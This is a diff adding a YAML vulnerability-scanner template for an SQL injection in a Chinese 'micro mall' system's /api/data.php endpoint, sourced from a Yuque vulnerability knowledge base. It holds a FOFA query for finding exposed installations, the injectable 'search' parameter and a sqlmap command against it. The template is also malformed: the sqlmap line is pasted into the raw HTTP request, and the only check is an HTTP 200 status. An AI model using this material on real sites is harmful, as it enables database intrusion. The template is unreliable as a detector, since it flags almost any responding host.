@@ -1,0 +1,32 @@
+id: poc-dy0qvfdzenecs19f
+info:
+  name: 微商城系统api 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dy0qvfdzenecs19f'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dy0qvfdzenecs19f
+    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+http:
+- raw:
+  - 'GET /api/data.php?mod=list&lx=2&search=123 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+
+    sqlmap -u http://xxx/api/data.php?mod=list&lx=2&search=123 -p search --level 3 --batch'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
